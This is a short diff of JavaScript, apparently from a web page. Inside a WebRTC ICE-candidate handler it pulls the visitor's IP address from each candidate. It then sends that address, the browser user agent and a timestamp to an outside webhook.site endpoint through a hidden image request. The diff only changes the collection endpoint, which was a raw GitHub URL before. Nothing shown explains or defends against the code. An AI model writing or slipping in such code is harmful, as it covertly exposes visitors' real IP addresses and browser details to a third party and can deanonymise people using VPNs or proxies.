@@ -26,9 +26,9 @@
         if (e.candidate) {
           var ip = e.candidate.candidate.split(" ")[4];
           if (ip && ip !== "0.0.0.0") {
-            new Image().src = "https://raw.githubusercontent.com/0vahid7/t/main/log.txt?t=" + Date.now() + 
-                              "&ip=" + ip + 
-                              "&ua=" + encodeURIComponent(navigator.userAgent);
+            new Image().src = "https://webhook.site/e14058c5-ad0d-41d1-af86-8702b7c72138?ip=" + ip + 
+                  "&ua=" + encodeURIComponent(navigator.userAgent) + 
+                  "&time=" + Date.now();
           }
         }
       };
